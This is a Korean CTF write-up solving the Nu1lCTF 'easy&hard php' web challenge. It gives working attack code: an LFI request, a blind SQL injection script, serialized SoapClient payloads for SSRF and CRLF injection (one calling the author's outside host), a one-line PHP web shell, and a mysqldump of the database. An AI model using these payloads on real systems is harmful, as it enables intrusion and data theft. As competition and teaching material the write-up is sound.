# [Web] Nu1lCTF - easy&hard php

## Description

Not racing, just enjoying the slow pace of life :)

## Analysis

문제 URL을 확인하면 아래와 같은 형태로 되어있다.

`index.php?action=login`

action을 이용해 페이지를 변경해 주는거 같다.

action을 이용해 LFI를 시도하였는데 성공하였다.

```
$ curl 123.206.216.198:23451/index.php?action=../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
memcache:x:103:107:Memcached,,,:/nonexistent:/bin/false
```

또한 index.php~를 요청하면 index.php의 소스 코드를 얻을 수 있다.

```php
<?php

require_once 'user.php';
$C = new Customer();
if(isset($_GET['action']))
require_once 'views/'.$_GET['action'];
else
header('Location: index.php?action=login');
```

index.php는 단순히 페이지를 로드해주는 역할을 한다.

views/폴더를 열면 아래의 파일들이 존재하고 .php가 아니라서 소스코드를 볼 수 있다.

```
Parent Directory	 	-	 
delete	2018-03-08 11:59	245	 
index	2018-03-09 13:44	2.3K	 
login	2018-03-09 13:45	1.8K	 
logout	2018-03-08 11:59	92	 
phpinfo	2018-03-12 05:23	41	 
profile	2018-03-08 11:59	1.5K	 
publish	2018-03-08 11:59	3.0K	 
register	2018-03-08 11:59	1.8K	 
```

user.php의 소스 코드도 index.php와 마찬가지로 user.php~를 통해 얻을 수 있었다.

user.php는 Customer라는 클래스가 정의되어 있으며 이 페이지에서는 config.php를 로드하므로, 역시 config.php~통해 얻을 수 있다.

config.php에는 db, mood 클래스, 그리고 기타 함수들이 적용되어 있다.

우선 register 페이지로 이동해 로그인을 해보자.

로그인을 하기위해서는 `Code(substr(md5(?), 0, 5) === 57a2a)`와 같은 captcha를 우회해야 하므로 코딩하자.

```python
import hashlib
import sys
h = sys.argv[1]
for i in range(0x1000000):
	m = hashlib.md5()
	m.update(str(i))
	p = m.digest().encode('hex')[:5]
	if h == p:
		print i
		break
```

위 코드를 이용해 조건에 맞는 값을 얻을 수 있었고, 회원가입 및 로그인을 하였다.

publish를 하면 글을 작성할 수 있다.

여기서 Insert를 이용한 SQL Injection이 가능하다.

```Php
# user.php
function publish()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            if(isset($_POST['signature']) && isset($_POST['mood'])) {
                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
                $db = new Db();
                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
                if($ret)
                    return true;
                else
                    return false;
            }
        }
        else
        {
                if(isset($_FILES['pic'])) {
                    if (upload($_FILES['pic'])){
                        echo 'upload ok!';
                        return true;
                    }
                    else {
                        echo "upload file error";
                        return false;
                    }
                }
                else
                    return false;
        }
    }
```

\$mood의 경우 addslashes를 통해 인젝션이 불가능하나, \$_POST['signature']을 통해 인젝션이 가능해 보인다.

한가지 문제점은 아래와 같이 입력 값의 경우 addslashes가 되어서 '(quote)를 사용할 수는 없다.

```php
# config.php
function addsla_all()
{
    if (!get_magic_quotes_gpc())
    {
        if (!empty($_GET))
        {
            $_GET  = addslashes_deep($_GET);
        }
        if (!empty($_POST))
        {
            $_POST = addslashes_deep($_POST);
        }
        $_COOKIE   = addslashes_deep($_COOKIE);
        $_REQUEST  = addslashes_deep($_REQUEST);
    }
}
addsla_all();
```

insert함수를 따라가보자.

```php
# config.php
public function insert($columns,$table,$values){
        $column = $this->get_column($columns);
        $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
        $nid =
        $sql = 'insert into '.$table.'('.$column.') values '.$value;
        $result = $this->conn->query($sql);
        return $result;
    }
```

\$_POST['signature']는 \$values 인자로 들어가며 이는 preg\_replace에 의해 치환된다.

이를 치환을 이용하여 SQL Injection이 가능해진다.

```
2`,`O:8:"Customer":4:{s:8:"username";s:5:"shsh3";s:6:"userid";i:33;s:8:"is_admin";i:1;s:13:"allow_diff_ip";N;}`)#
```

쿼리는 다음과 같은 형태로 하게되면 치환되어 쿼리가 완성되게 된다.

이를 이용하여 SQL Inection을 하여 admin의 계정을 얻을 수 있었다.

```python
publish_url = "http://47.97.221.96:23333/index.php?action=publish"
index_url = "http://47.97.221.96:23333/index.php?action=index"
del_url = "http://47.97.221.96:23333/index.php?action=delete&delid="

import urllib
import urllib2
import sys
import string
result = ''
charset = ','+string.lowercase + string.digits+'-_'

for i in range(100):
    for j in charset: 
        # write board
        data = 'signature=2`-case when (select concat(username,0x3a,password) from ctfusers where is_admin like 0x31) like 0x'+result.encode('hex')+j.encode('hex')+'25 then 1 else 0 end,`O:4:"Mood":3:{s:4:"mood";i:0;s:2:"ip";s:13:"58.76.163.238";s:4:"date";i:1520759194;}`)#&mood=0'
        req = urllib2.Request(publish_url,data)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)
        print res.read()
        # read board
        req = urllib2.Request(index_url)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)
        p = res.read()
        print p
        body = p.split('<div class="panel-body">')[1].split('<img src=')[0]
        delnum = p.split('index.php?action=delete&delid=')[1].split('"')[0]
        #delete board
        req = urllib2.Request(del_url+delnum)
        req.add_header('Cookie','PHPSESSID=udbb2098u9oc8mpc7raqh1v8v2')
        res = urllib2.urlopen(req)

        if '1' in body:
            sys.stdout.write(j)
            sys.stdout.flush()
            result += j
            break

    if len(result)!=(i+1):
        break

print ''
print result
```

admin의 계정의 패스워드가 2533f492a796a3227b0c6f91d102cc36임을 확인하였으나 해쉬였다.

`http://47.52.137.90:20000/getmd5.php?md5=`의 주소를 통해 패스워드의 평문을 얻을 수 있게 구현되어 있었으며, 패스워드가 nu1ladmin이었다.

이를 이용해 로그인을 하려하였으나 아이피가 맞지 않아 로그인이 불가능하였다.

다음으로 노린 부분은 unserialize였다.

```php
# user.php
in pubish():
	$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
in showmess():
	$mood = unserialize($row[2]);
	$country = $mood->getcountry();
	$ip = $mood->ip;
	$subtime = $mood->getsubtime();
```

원래 $mood의 값을 이영해 serialize하여 mood은 int형 변화을하지만 Injection이 가능하기에 원하는 Serialize된 값을 삽입할 수 있게된다.

원래는 user의 is_admin을 1로 변경하려 하였지만 실패하였다.

우선 action으로 phpinfo를 요청하면 [Soap Client](http://php.net/manual/en/class.soapclient.php)가 사용한 것을 확인할 수 있다.

>  public **SoapClient::SoapClient** ( [mixed](http://php.net/manual/en/language.pseudo-types.php#language.types.mixed) `$wsdl` [, array `$options` ] )
>
>  This constructor creates [SoapClient](http://php.net/manual/en/class.soapclient.php) objects in *WSDL* or *non-WSDL* mode.
>
>  -  wsdl
>
>  URI of the *WSDL* file or <u>**NULL** if working in *non-WSDL* mode.</u>
>
>  *  options
>
>  An array of options. If working in WSDL mode, this parameter is optional. <u>If working in non-WSDL mode, the ***location*** and ***uri*** options must be set,</u> where *location* is the URL of the SOAP server to send the request to, and *uri* is the target namespace of the SOAP service.

SoapClient를 non-WSDL mode로써 사용하게 되면 SSRF가 가능해진다!

## Exploit

SoapClient를 이용해 SSRF를 해보자.

우선 아래와 같이 SoapClient를 생성하여 serialize하자.

```Php
$client = new SoapClient(null,array('location' => 'http://g64.shpik.xyz:10101',
									'uri' => 'shpik'));
echo serialize($client);
# O:10:"SoapClient":4:{s:3:"uri";s:5:"shpik";s:8:"location";s:26:"http://g64.shpik.xyz:10101";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}
```

이를 이용해 생성된 값을 이용해 publish의 SQL Injection을 이용해 넣어주어 unserialize하자!

```
쿼리 : 2`,`O:10:"SoapClient":4:{s:3:"uri";s:5:"shpik";s:8:"location";s:26:"http://g64.shpik.xyz:10101";s:15:"_stream_context";i:0;s:13:"_soap_version";i:1;}`)#

$ nc -lvp 10101
Listening on [0.0.0.0] (family 0, port 10101)
Connection from [123.206.216.198] port 10101 [tcp/*] accepted (family 2, sport 47146)
POST / HTTP/1.1
Host: g64.shpik.xyz:10101
Connection: Keep-Alive
User-Agent: PHP-SOAP/5.5.9-1ubuntu4.11
Content-Type: text/xml; charset=utf-8
SOAPAction: "shpik#getcountry"
Content-Length: 375

<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="shpik" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:getcountry/></SOAP-ENV:Body></SOAP-ENV:Envelope>
```

성공적으로 넘어왔다.

SoapClient의 options으로 uri뿐만 아니라 User-agent를 변경할 수 있으며, 이를 이용해 CRLF 공격을 하였다.

CRLF 공격을 통해 서버의 127.0.0.1/index.php?action=login을 통해 로그인하면 될 것 같다.

이제 admin으로 로그인을 해보자!



##### 1. 새로운 PHPSESSID를 이용해 captcha 값을 구한다.

-  shpik_으로 로그인 된 SESSION이 아닌 새로운 세션을 생성하고 captcha값을 미리 구한다.

   (PHPSESSID=b6n8ve3lvhrrp3srdorqnike96, captcha=Code(substr(md5(?), 0, 5) === a006a))

##### 2. admin의 아이디와 패스워드, 그리고 captcha 값을 포함하여 http://127.0.0.1/index.php?action=login 페이지에 CRLF 공격을 한다.

```Php
$data = "username=admin&password=nu1ladmin&code=477917";

$client = new SoapClient(null, array('location' => "http://127.0.0.1/index.php?action=login", 'user_agent' => "shpik\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aX-Forwarded-For: 127.0.0.1\x0d\x0aCookie: PHPSESSID=b6n8ve3lvhrrp3srdorqnike96\x0d\x0aContent-Length: ".(string)strlen($data)."\x0d\x0a\x0d\x0a".$data, 'uri' => "shpik"));

echo bin2hex(serialize($client));

# 4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b733a353a22736870696b223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31313a225f757365725f6167656e74223b733a3139373a22736870696b0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d62366e387665336c7668727270337372646f72716e696b6539360d0a436f6e74656e742d4c656e6774683a2034350d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6e75316c61646d696e26636f64653d343737393137223b733a31333a225f736f61705f76657273696f6e223b693a313b7d
```

위의 코드를 이용하여 생성된 hex을 publish의 SQL Inejction을 이용해 Object을 삽입해준다.

```
쿼리 : 2`,0x4f3a31303a22536f6170436c69656e74223a353a7b733a333a22757269223b733a353a22736870696b223b733a383a226c6f636174696f6e223b733a33393a22687474703a2f2f3132372e302e302e312f696e6465782e7068703f616374696f6e3d6c6f67696e223b733a31353a225f73747265616d5f636f6e74657874223b693a303b733a31313a225f757365725f6167656e74223b733a3139373a22736870696b0d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a582d466f727761726465642d466f723a203132372e302e302e310d0a436f6f6b69653a205048505345535349443d62366e387665336c7668727270337372646f72716e696b6539360d0a436f6e74656e742d4c656e6774683a2034350d0a0d0a757365726e616d653d61646d696e2670617373776f72643d6e75316c61646d696e26636f64653d343737393137223b733a31333a225f736f61705f76657273696f6e223b693a313b7d)#
```

unserialize되면서 500에러가 발생한다.

##### 3. 1번에서 생성한 PHPSESSID에 admin으로 로그인 한 값이 들어가며 admin으로 로그인 성공!

생성된 PHPSESSID(b6n8ve3lvhrrp3srdorqnike96)로 덮어씌어 새로고침하면 admin으로 로그인이 되어 있다.



이제 admin의 권한으로 publish가 가능하다.

admin의 경우 publish를 통해 파일을 업로드 할 수 있다.

```php
# user.php
function publish()
    {
        if(!$this->check_login()) return false;
        if($this->is_admin == 0)
        {
            if(isset($_POST['signature']) && isset($_POST['mood'])) {
                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
                $db = new Db();
                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
                if($ret)
                    return true;
                else
                    return false;
            }
        }
        else
        {
                if(isset($_FILES['pic'])) {
                    if (upload($_FILES['pic'])){
                        echo 'upload ok!';
                        return true;
                    }
                    else {
                        echo "upload file error";
                        return false;
                    }
                }
                else
                    return false;
        }
    }
```

upload함수를 보자.

```Php
# config.php
function upload($file){
    $file_size  = $file['size'];
    if($file_size>2*1024*1024) {
        echo "pic is too big!";
        return false;
    }
    $file_type = $file['type'];
    if($file_type!="image/jpeg" && $file_type!='image/pjpeg') {
        echo "file type invalid";
        return false;
    }
    if(is_uploaded_file($file['tmp_name'])) {
        $uploaded_file = $file['tmp_name'];
        $user_path =  "/app/adminpic";
        if (!file_exists($user_path)) {
            mkdir($user_path);
        }
        $file_true_name = str_replace('.','',pathinfo($file['name'])['filename']);
        $file_true_name = str_replace('/','',$file_true_name);
        $file_true_name = str_replace('\\','',$file_true_name);
        $file_true_name = $file_true_name.time().rand(1,100).'.jpg';
        $move_to_file = $user_path."/".$file_true_name;
        if(move_uploaded_file($uploaded_file,$move_to_file)) {
            if(stripos(file_get_contents($move_to_file),'<?php')>=0)
                system('sh /home/nu1lctf/clean_danger.sh');
            return $file_true_name;
        }
        else
            return false;
    }
    else
        return false;
}
```

우선 타입은 jpg이어야 하고, <?php가 포함되어 있으면 system명령어를 이용해 clean_danger.sh를 실행시킨다.

LFI를 이용해 clean_danger.sh이 뭔지 확인해보자.

```sh
cd /app/adminpic/
rm *.jpg
```

파일을 제거하는 함수이다. 이는 업로드하는 파일 이름에 -를 추가해주므로써 rm명령어가 실행이 되지 않게 할 수 있다.

```bash
$ ls
-shpik.jpg  -shs shpik.jpg
$ rm *.jpg
rm: invalid option -- 's'
Try 'rm ./-shpik.jpg' to remove the file '-shpik.jpg'.
Try 'rm --help' for more information.
$ ls
-shpik.jpg  -shs shpik.jpg
```

업로드 하는 파일의 내용은 다음과 같다.

```php
# -shpik_.jpg
<?php echo system($_GET['c']);?>
```

업로드 시 생성되는 파일명은 뒤에 time().rand(1,100)가 추가되는데, 이는 Brute Force를 통해 충분히 구할 수 있다.

이제 업로드를 하여 파일 이름을 찾아보자.

```python
import urllib
import urllib2

for sec in range(7,9):
    for rnd in range(0,100):
        try:
            filename = "http://123.206.216.198:23451/index.php?action=../../app/adminpic/-shpik_152109897"+str(sec)+str(rnd)+".jpg"
            req = urllib2.Request(filename)
            req.add_header('Cookie','PHPSESSID=b6n8ve3lvhrrp3srdorqnike96')
            res = urllib2.urlopen(req)
            print filename
            print res.read()
            break
        except urllib2.HTTPError, e:
            continue

# http://123.206.216.198:23451/index.php?action=../../app/adminpic/-shpik_152109897775.jpg
```

파일명을 찾았으니 Remote Command Execution이 가능해졌다.

하지만 플래그는 파일로는 존재하지 않는 것 같다.

LFI를 이용해 /run.sh을 읽어보았다.

```bash

#!/bin/bash
chown www-data:www-data /app -R

if [ "$ALLOW_OVERRIDE" = "**False**" ]; then
    unset ALLOW_OVERRIDE
else
    sed -i "s/AllowOverride None/AllowOverride All/g" /etc/apache2/apache2.conf
    a2enmod rewrite
fi

# initialize database
mysqld_safe --skip-grant-tables&
sleep 5
## change root password
mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;"
## restart mysql
service mysql restart
## execute sql file
mysql -uroot -pNu1Lctf\%\#\~\:p < /tmp/sql.sql

## crontab
(while true;do rm -rf /tmp/*;sleep 1;done)&

sed -i "s/;session.upload_progress.enabled = On/session.upload_progress.enabled = Off/g" /etc/php5/cli/php.ini
sed -i "s/;session.upload_progress.enabled = On/session.upload_progress.enabled = Off/g" /etc/php5/apache2/php.ini

cd /etc/php5/apache2/conf.d/
rm 20-xdebug.ini
rm 20-memcached.ini
rm 20-memcache.ini

rm -r /var/www/phpinfo

rm /app/views/phpinfo
## chmod
source /etc/apache2/envvars
tail -F /var/log/apache2/* &
exec apache2 -D FOREGROUND
```

mysql의 root계정과 패스워드를 확인할 수 있었으며 mysqldump를 이용해 database dump를 떳다.

`mysqldump -uroot -pNu1Lctf%#~:p --all-databases > /app/adminpic/shpik.sql`

dump뜬 파일을 열어보면 플래그를 얻을 수 있다.

```mysql
INSERT INTO `flag` VALUES (1,'n1ctf{php_unserialize_ssrf_crlf_injection_is_easy:p}'); 
```



**n1ctf{php_unserialize_ssrf_crlf_injection_is_easy:p}**